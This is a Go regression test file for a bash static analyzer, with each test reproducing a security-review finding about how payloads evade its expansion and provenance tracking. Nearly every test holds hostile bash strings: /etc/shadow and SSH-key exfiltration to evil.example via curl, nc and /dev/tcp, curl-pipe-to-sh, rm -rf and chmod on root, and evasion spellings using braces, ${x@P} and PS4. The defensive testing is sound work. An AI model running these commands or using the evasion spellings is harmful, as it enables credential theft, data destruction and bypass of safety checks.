package analysis

// Regression tests for the expansion-walker, abstract-execution and
// data-flow-provenance findings of security-review.md: F8, F23, F37, F40, F46,
// F48, F51, F58, F59, F60, F61, F62, F63, F64, F67, F70, F72, F73 and F74.
//
// Each test reproduces the finding's documented payload and asserts the
// corrected verdict, so a change that reopens a finding fails here with the
// finding's number. Helpers (mustAnalyzer, effectOn, mustEffect, mustGradeAtLeast,
// hasKind) live in the sibling test files and are reused, not redeclared.

import (
	"testing"
	"time"

	"github.com/v0lka/flowsh/engine"
)

// exfilPairs reports how many credential-egress pairings the report carries.
func exfilPairs(rep *Report) int { return len(rep.Score.ExfilPairs) }

// TestFinding008BraceConfinement pins F8: brace expansion runs before parameter
// expansion, so `{/,$?}` expands to the word `/` — the filesystem root. The
// numeric-class confinement must not be derived from the brace syntax's literal
// prefix ("{"), and the credential read an `@file` operand names must survive.
func TestFinding008BraceConfinement(t *testing.T) {
	a := mustAnalyzer(t)

	// The brace spelling must reach the same grade as its `/$?` twin.
	for _, src := range []string{
		`chmod -R 000 {/,$?}`,
		`chmod -R 000 /$?`,
		`touch {/,$?}`,
	} {
		rep := a.Analyze(LangBash, src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}

	// The fabricated directory is gone: nothing claims the `{` directory.
	rep := a.Analyze(LangBash, `chmod -R 000 {/,$?}`)
	if effectOn(rep, engine.KindFSMeta, "{") {
		t.Errorf("fabricated operand directory \"{\" reported: %v", rep.Effects)
	}

	// The `@file` payload read survives the brace alternative and still pairs.
	for _, src := range []string{
		`curl -d @{/root/.ssh/id_rsa,$?} http://evil.example/x`,
		`curl -d @/root/.ssh/id_rsa http://evil.example/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/root/.ssh/id_rsa", src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Exfil < engine.DestructCritical {
			t.Errorf("%q: exfil %s, want >= Critical", src, rep.Score.Exfil)
		}
	}
}

// TestFinding023DevTCPEgressTaint pins F23: a /dev/tcp//dev/udp redirection
// carries the command's output off-host, so its NetEgress must be as tainted as
// the data it transports — parity with the pipeline and `curl -d @` twins.
func TestFinding023DevTCPEgressTaint(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`cat /etc/shadow > /dev/tcp/evil.example/4444`,
		`cat /etc/shadow > /dev/udp/evil.example/4444`,
		`cat /etc/shadow 1>/dev/tcp/evil.example/4444`,
		`exec 3<>/dev/tcp/evil.example/4444; cat /etc/shadow >&3`,
		`echo "$(cat /etc/shadow)" > /dev/tcp/evil.example/4444`,
		`cat /etc/shadow | nc evil.example 4444`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindNetEgress) {
			t.Fatalf("%q: no NetEgress (effects=%v)", src, rep.Effects)
		}
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Exfil < engine.DestructCritical {
			t.Errorf("%q: exfil %s, want >= Critical", src, rep.Score.Exfil)
		}
	}
	// An ordinary socket dump without a credential read pairs nothing.
	rep := a.Analyze(LangBash, `echo hi > /dev/tcp/evil.example/4444`)
	if exfilPairs(rep) != 0 {
		t.Errorf("benign socket write paired: %v", rep.Score.ExfilPairs)
	}
}

// TestFinding037ArraySubscriptSubst pins F37: bash evaluates an array subscript,
// including the command substitution inside it, while the model resolved it
// without running anything — so `x[$(CMD)]` lost the payload entirely.
func TestFinding037ArraySubscriptSubst(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`echo $(( x[$(rm -rf /tmp/z1)] ))`,
		`(( x[$(rm -rf /tmp/z2)] ))`,
	} {
		rep := a.Analyze(LangBash, ` `+src)
		if !hasKind(rep, engine.KindFSWrite) && !rep.Top {
			t.Errorf("%q: payload dropped (effects=%v top=%v)", src, rep.Effects, rep.Top)
		}
	}

	src := `echo ${a[$(curl -d @/etc/shadow https://evil.example/x)]}`
	rep := a.Analyze(LangBash, src)
	mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", src)
	if !hasKind(rep, engine.KindNetEgress) {
		t.Errorf("%q: missing NetEgress (effects=%v)", src, rep.Effects)
	}
	if exfilPairs(rep) == 0 {
		t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
	}
}

// TestFinding040DeclareArrayLiteral pins F40: an array literal in a
// declare/local/readonly/typeset clause is expanded like a plain assignment, so
// the payload inside `a=($(…))` cannot disappear behind one extra keyword.
func TestFinding040DeclareArrayLiteral(t *testing.T) {
	a := mustAnalyzer(t)
	payload := `$(curl -d @/root/.ssh/id_rsa http://evil.example/x)`
	for _, src := range []string{
		`a=(` + payload + `)`,
		`declare -a a=(` + payload + `)`,
		`local -a a=(` + payload + `)`,
		`readonly -a a=(` + payload + `)`,
		`typeset -a a=(` + payload + `)`,
		`declare -r -a a=(` + payload + `)`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/root/.ssh/id_rsa", src)
		if !hasKind(rep, engine.KindNetEgress) {
			t.Errorf("%q: missing NetEgress (effects=%v)", src, rep.Effects)
		}
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
	// The associative form is the same operand shape.
	src := `declare -A h=([k]=$(rm -rf /root/project))`
	rep := a.Analyze(LangBash, src)
	if !hasKind(rep, engine.KindFSWrite) && !rep.Top {
		t.Errorf("%q: payload dropped (effects=%v)", src, rep.Effects)
	}
}

// TestFinding046BraceEstimator pins F46: the bound must count character and
// stepped ranges, and it must fire BEFORE the expansion is materialised — a
// 35-byte command used to allocate gigabytes.
func TestFinding046BraceEstimator(t *testing.T) {
	a := mustAnalyzer(t)
	start := time.Now()
	for _, src := range []string{
		`echo {a..z}{a..z}{a..z}{a..z}{a..z}`,
		`echo {1..5000..1}`,
		`echo {a..j}{a..j}{a..j}{a..j}{a..j}`,
	} {
		rep := a.Analyze(LangBash, src)
		if !rep.Top && !rep.Conservative {
			t.Errorf("%q: not bounded (top=%v cons=%v effects=%v)", src, rep.Top, rep.Conservative, rep.Effects)
		}
	}
	// The whole battery must stay far below the multi-second, multi-GiB cost the
	// finding measured for a single spelling.
	if el := time.Since(start); el > 10*time.Second {
		t.Errorf("bounded brace battery took %s, want < 10s", el)
	}
	// Small ranges stay precise: the estimator must not swallow them.
	rep := a.Analyze(LangBash, `echo {a..j..3}`)
	if rep.Top {
		t.Errorf("{a..j..3} degraded to top: %v", rep.Effects)
	}
	if !effectOn(rep, engine.KindStdio, "a") {
		t.Errorf("{a..j..3} lost its fields: %v", rep.Effects)
	}
}

// TestFinding048StepBudgetPerExpandedField pins F48: the budget is charged per
// expanded field, so a loop body cannot multiply the per-word field cap by its
// iteration count.
func TestFinding048StepBudgetPerExpandedField(t *testing.T) {
	a := mustAnalyzer(t)
	start := time.Now()
	for _, src := range []string{
		`for i in {1..4096}; do echo {1..4096}; done`,
		`for i in {1..4096}; do echo {1..4096} {1..4096} {1..4096}; done`,
		`for ((;;)); do echo {1..4096}; done`,
	} {
		rep := a.Analyze(LangBash, src)
		if !rep.Top {
			t.Errorf("%q: budget never fired (top=%v cons=%v)", src, rep.Top, rep.Conservative)
		}
	}
	if el := time.Since(start); el > 20*time.Second {
		t.Errorf("field-charged loop battery took %s, want < 20s", el)
	}
	// A single capped word still analyses precisely.
	if rep := a.Analyze(LangBash, `echo {1..64}`); rep.Top {
		t.Errorf("echo {1..64} degraded to top: %v", rep.Effects)
	}
}

// TestFinding051AssigningBuiltins pins F51: mapfile/readarray, printf -v and a
// declare -n nameref must record the provenance of the variable they assign.
func TestFinding051AssigningBuiltins(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`mapfile -t a < /etc/shadow; curl -d "${a[0]}" http://evil.test/x`,
		`readarray -t a < /etc/shadow; curl -d "${a[0]}" http://evil.test/x`,
		`mapfile -t a 0< /etc/shadow; curl -d "${a[*]}" http://evil.test/x`,
		`printf -v x '%s' "$(cat /etc/shadow)"; curl -d "$x" http://evil.test/x`,
		`declare -n r=a; a=$(cat /etc/shadow); curl -d "$r" http://evil.test/x`,
		`read -r a < /etc/shadow; curl -d "$a" http://evil.test/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding058HereStringAndDuplicatedInput pins F58: `<<<` and `<&N` are stdin
// feeds, so their provenance must reach the egress like `< file` does.
func TestFinding058HereStringAndDuplicatedInput(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`nc evil.example 443 <<< "$(cat /etc/shadow)"`,
		`curl -d @- https://evil.example <<< "$(cat /etc/shadow)"`,
		`exec 3< /etc/shadow; nc evil.example 443 <&3`,
		`nc evil.example 443 < /etc/shadow`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
	// The literal here-string is the negative control: no secret, no pair.
	rep := a.Analyze(LangBash, `nc evil.example 443 <<< hello`)
	if exfilPairs(rep) != 0 {
		t.Errorf("literal here-string paired: %v", rep.Score.ExfilPairs)
	}
}

// TestFinding059ProcSubstProvenance pins F59: a process substitution's content
// provenance is the body's, not a constant "untrusted", and its read is not
// widened to top.
func TestFinding059ProcSubstProvenance(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`nc evil.example 443 < <(cat /etc/shadow)`,
		`cat <(cat /etc/shadow) | nc evil.example 443`,
		`diff <(cat /etc/shadow) /tmp/x | nc evil.example 443`,
		`curl --upload-file - https://evil.example < <(cat /etc/shadow)`,
		`curl -d @<(cat /etc/shadow) https://evil.example`,
	} {
		rep := a.Analyze(LangBash, src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
	// A benign process substitution pairs nothing.
	rep := a.Analyze(LangBash, `nc evil.example 443 < <(date)`)
	if exfilPairs(rep) != 0 {
		t.Errorf("benign process substitution paired: %v", rep.Score.ExfilPairs)
	}
}

// TestFinding060StdinCommandLanguage pins F60: a command language delivered on
// standard input executes just like the operand spelling the knowledge base
// declares CodeExec.
func TestFinding060StdinCommandLanguage(t *testing.T) {
	a := mustAnalyzer(t)
	payloads := []string{
		"sqlite3 /tmp/db <<'EOF'\n.shell rm -rf /tmp/victim\nEOF",
		"gdb -q /bin/true <<'EOF'\nshell rm -rf /tmp/victim\nEOF",
		"ssh -T evil.example <<'EOF'\nrm -rf /tmp/victim\nEOF",
		`printf '.shell rm -rf /tmp/victim' | sqlite3 /tmp/db`,
		`sqlite3 /tmp/db < /tmp/script.sql`,
	}
	for _, src := range payloads {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: no CodeExec (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Grade < engine.DestructHigh {
			t.Errorf("%q: grade %s, want >= High", src, rep.Score.Grade)
		}
	}
	// Precision controls: an unfed client stays bounded, and `ssh -n` refuses to
	// read stdin.
	for _, src := range []string{
		`sqlite3 /tmp/db`,
		`sqlite3 /tmp/db < /dev/null`,
		`gdb -q /bin/true <<< ""`,
		"ssh -n evil.example <<'EOF'\nrm -rf /tmp/victim\nEOF",
	} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: false CodeExec (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding061PositionalProvenance pins F61: the positional parameters, `set
// --`, `shift`, `${x:=…}`, `((x=…))` and `let` all hand provenance on.
func TestFinding061PositionalProvenance(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`f() { curl -d "$1" http://evil.test/x; }; f "$(cat /etc/shadow)"`,
		`f() { curl -d "$@" http://evil.test/x; }; f "$(cat /etc/shadow)"`,
		`set -- "$(cat /etc/shadow)"; curl -d "$1" http://evil.test/x`,
		`set -- a "$(cat /etc/shadow)"; shift; curl -d "$1" http://evil.test/x`,
		`: ${x:=$(cat /etc/shadow)}; curl -d "$x" http://evil.test/x`,
		`let "x=$(cat /etc/shadow)"; curl -d "$x" http://evil.test/x`,
		`x=0; ((x=$(cat /etc/shadow))); curl -d "$x" http://evil.test/x`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
	// The plain assignment twin must keep pairing (no over-degradation).
	rep := a.Analyze(LangBash, `x=$(cat /etc/shadow); curl -d "$x" http://evil.test/x`)
	if exfilPairs(rep) == 0 {
		t.Errorf("assignment twin lost its pair: %v", rep.Effects)
	}
}

// TestFinding062ParamExpansionNestedWords pins F62: the nested word of an
// alternate-value or replacement operator is part of the expansion's value, so
// its provenance belongs to the word.
func TestFinding062ParamExpansionNestedWords(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`curl -d "${x:-$(cat /etc/shadow)}" http://evil.test/x`,
		`curl -d "${x-$(cat /etc/shadow)}" http://evil.test/x`,
		`curl -d "${x:=$(cat /etc/shadow)}" http://evil.test/x`,
		`curl -d "${x=$(cat /etc/shadow)}" http://evil.test/x`,
		`x=1; curl -d "${x:+$(cat /etc/shadow)}" http://evil.test/x`,
		`x=1; curl -d "${x+$(cat /etc/shadow)}" http://evil.test/x`,
		`x=abc; curl -d "${x/b/$(cat /etc/shadow)}" http://evil.test/x`,
		`y=${x:-$(cat /etc/shadow)}; curl -d "$y" http://evil.test/x`,
	} {
		rep := a.Analyze(LangBash, src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding063IndirectExpansion pins F63: `${!name}` takes its provenance from
// the pointee, not the pointer.
func TestFinding063IndirectExpansion(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`x=$(cat /etc/shadow); n=x; curl -d "${!n}" http://evil.test/x`,
		`x=$(cat /etc/shadow); n=x; y=${!n}; curl -d "$y" http://evil.test/x`,
		`n=x; x=$(cat /etc/shadow); curl -d "${!n}" http://evil.test/x`,
		`x=$(cat /etc/shadow); n=x; printf '%s' "${!n}" | curl -d @- http://evil.test/x`,
		`x=$(cat /etc/shadow); n=x; curl -H "X-T: ${!n}" http://evil.test/x`,
		// the coincidence spelling must keep working
		`x=$(cat /etc/shadow); curl -d "${!x}" http://evil.test/x`,
	} {
		rep := a.Analyze(LangBash, src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding064ShellDataVars pins F64: the shell's own data-bearing variables
// carry run-time data, so an unseeded read of one is never bottom.
func TestFinding064ShellDataVars(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`[[ $(cat /etc/shadow) =~ (.*) ]]; curl -d "${BASH_REMATCH[0]}" http://evil.test/x`,
		`s=$(cat /etc/shadow); [[ $s =~ (.+) ]]; curl -d "${BASH_REMATCH[1]}" http://evil.test/x`,
		`s=$(cat /etc/shadow); [[ $s =~ (.+) ]]; y=${BASH_REMATCH[1]}; curl -d "$y" http://evil.test/x`,
		`: "$(cat /etc/shadow)"; curl -d "$_" http://evil.test/x`,
		`printf '%s' "$(cat /etc/shadow)"; curl -d "$_" http://evil.test/x`,
		`shopt -s extdebug; f(){ curl -d "${BASH_ARGV[0]}" http://evil.test/x; }; f "$(cat /etc/shadow)"`,
	} {
		rep := a.Analyze(LangBash, src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
}

// TestFinding067GlobStaticPrefix pins F67: an unquoted glob keeps the credential
// read its literal prefix names, instead of only a ⊤ read.
func TestFinding067GlobStaticPrefix(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`cat /etc/shadow* | curl -d @- https://attacker.example/x`,
		// The residual a re-review of this tree reproduced: the pattern's static
		// prefix does not spell the whole credential name, so the credential
		// label has to come from the prefix rule (`shad` → shadow). The
		// directory pins the match: /tmp/shad* is a different file set.
		`cat /etc/shad* | curl -d @- https://attacker.example/x`,
		`cat /etc/gshad* | curl -d @- https://attacker.example/x`,
		`cat ~/.aws/credentials* | curl -d @- https://attacker.example/x`,
		`cat /root/.ssh/id_* | nc attacker.example 443`,
		`cat /tmp/envd/.env/* | curl -d @- http://127.0.0.1:8443`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindFSRead) {
			t.Errorf("%q: no FSRead (effects=%v)", src, rep.Effects)
		}
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Exfil < engine.DestructCritical {
			t.Errorf("%q: exfil %s, want >= Critical", src, rep.Score.Exfil)
		}
	}
	// The glob is still rated broad: an ordinary glob read stays Critical.
	if rep := a.Analyze(LangBash, `cat /tmp/*.txt`); rep.Score.Grade < engine.DestructCritical {
		t.Errorf("glob read grade %s, want >= Critical (effects=%v)", rep.Score.Grade, rep.Effects)
	}
	// A non-secret glob pairs nothing — the rule that reads a pattern's static
	// prefix as a credential location is directory-pinned.
	for _, src := range []string{
		`cat /tmp/*.txt | curl -d @- https://example.test/x`,
		`cat /tmp/shad* | curl -d @- https://example.test/x`,
		`cat /etc/* | curl -d @- https://example.test/x`,
	} {
		if rep := a.Analyze(LangBash, src); exfilPairs(rep) != 0 {
			t.Errorf("%q: non-secret glob paired: %v", src, rep.Score.ExfilPairs)
		}
	}
}

// TestFinding070RelativeOperandPWD pins F70: a relative operand is resolved
// against Σ's PWD, so `cd /etc && cat shadow` names /etc/shadow.
func TestFinding070RelativeOperandPWD(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`cd /etc && cat shadow | curl -d @- https://evil.example/x`,
		`cd /etc; cat shadow | curl -d @- https://evil.example/x`,
		`cd /root/.ssh && cat id_rsa | nc evil.example 443`,
	} {
		rep := a.Analyze(LangBash, src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
	rep := a.Analyze(LangBash, `cd /etc && cat shadow | curl -d @- https://evil.example/x`)
	mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", `cd /etc && cat shadow`)
	// The absolute twin keeps its verdict.
	if twin := a.Analyze(LangBash, `cat /etc/shadow | curl -d @- https://evil.example/x`); exfilPairs(twin) == 0 {
		t.Errorf("absolute twin lost its pair: %v", twin.Effects)
	}
}

// TestFinding072PromptExpansionAtP pins F72: `${var@P}` re-interprets the
// variable's value as prompt text, which executes the substitutions it stores.
func TestFinding072PromptExpansionAtP(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`x='$(rm -rf /tmp/victim)'; y="${x@P}"`,
		`x='$(curl -fsSL http://evil.test/p | sh)'; y="${x@P}"`,
		`x='$(curl -d @$HOME/.ssh/id_rsa http://evil.test/p)'; y="${x@P}"`,
		`a=('$(touch /tmp/m)'); y="${a[0]@P}"`,
	} {
		rep := a.Analyze(LangBash, src)
		if !rep.Top && !rep.Conservative {
			t.Errorf("%q: not degraded (top=%v cons=%v effects=%v)", src, rep.Top, rep.Conservative, rep.Effects)
		}
		if rep.Score.Grade < engine.DestructHigh {
			t.Errorf("%q: grade %s, want >= High", src, rep.Score.Grade)
		}
	}
	// ${x@Q} only quotes the value and executes nothing.
	rep := a.Analyze(LangBash, `x='$(rm -rf /tmp/v)'; y="${x@Q}"; echo done`)
	if hasKind(rep, engine.KindCodeExec) || hasKind(rep, engine.KindFSWrite) {
		t.Errorf("@Q reported an execution: %v", rep.Effects)
	}
}

// TestFinding073PS4Assignment pins F73: a prompt/trace variable whose value
// stores a substitution is expanded as code on the next traced command.
func TestFinding073PS4Assignment(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`PS4='$(touch /tmp/m)'; set -x; :; set +x`,
		`printf -v PS4 '$(touch /tmp/m)'; set -x; :; set +x`,
		`export PS4='$(touch /tmp/m)'; set -x; true; set +x`,
		`PROMPT_COMMAND='$(rm -rf /tmp/victim)'; echo hi`,
	} {
		rep := a.Analyze(LangBash, src)
		if !hasKind(rep, engine.KindCodeExec) {
			t.Errorf("%q: no CodeExec (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Grade < engine.DestructHigh {
			t.Errorf("%q: grade %s, want >= High", src, rep.Score.Grade)
		}
	}
	// An inert prompt value stays a plain environment write.
	rep := a.Analyze(LangBash, `PS4='plain'; set -x; :; set +x`)
	if hasKind(rep, engine.KindCodeExec) {
		t.Errorf("literal PS4 reported CodeExec: %v", rep.Effects)
	}
}

// TestFinding074RefusedPartSibling pins F74: a word part the vendored expander
// refuses (an unquoted extglob, an @-operator) must not suppress the
// substitutions after it in the same word, and the refusal degrades to ⊤.
func TestFinding074RefusedPartSibling(t *testing.T) {
	a := mustAnalyzer(t)

	src := `shopt -s extglob; echo @(a|b)$(rm -rf /root/.ssh)`
	rep := a.Analyze(LangBash, src)
	if !hasKind(rep, engine.KindFSWrite) && !rep.Top {
		t.Errorf("%q: sibling substitution dropped (effects=%v)", src, rep.Effects)
	}
	if !rep.Top && !rep.Conservative {
		t.Errorf("%q: refused part not degraded to top (top=%v cons=%v)", src, rep.Top, rep.Conservative)
	}

	for _, src := range []string{
		`v=@(a|b)$(cat /etc/shadow | curl -d @- http://evil.example/x)`,
		`x=1; v="${x@P}$(cat /etc/shadow | curl -d @- http://evil.example/x)"`,
		`echo "@(a|b)"$(cat /etc/shadow | curl -d @- http://evil.example/x)`,
	} {
		rep := a.Analyze(LangBash, src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
	}
}
